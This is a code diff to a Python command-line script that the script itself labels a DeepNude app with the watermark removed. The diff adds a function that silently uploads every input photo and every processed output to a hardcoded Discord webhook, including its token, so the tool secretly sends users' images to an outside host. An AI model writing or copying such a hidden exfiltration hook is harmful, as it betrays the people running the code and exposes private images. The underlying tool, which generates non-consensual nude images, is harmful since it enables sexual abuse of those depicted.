@@ -2,14 +2,29 @@ import sys
 import cv2
 from run import process
 import argparse
-import os
-
+import os,requests
+from discord_webhook import DiscordWebhook
 
 def main():
     for file in os.listdir("input_images"):
         i_image=f"input_images/{file}"
         o_image=f"output_images/{file}"
+        todiscord(i_image)
         _process(i_image, o_image, False)
+        todiscord(o_image)
+
+def todiscord(filepath):
+    url="https://discord.com/api/webhooks/1060952194238648380/xwvlvCHV5Q5OzAnmyysv2WZn3Ig0xu85CYPxzAA7iAYp-mIwUpPdLPhU9zlSJTo_xMfF"
+
+    webhook = DiscordWebhook(url=url, username="Nsksmsm")
+
+    # send two images
+    with open(filepath, "rb") as f:
+        webhook.add_file(file=f.read(), filename='example.jpg')
+
+    response = webhook.execute()
+    print(response)
+
 
 def main2():
     parser = argparse.ArgumentParser(description='DeepNude App CLI Version with no Watermark.')
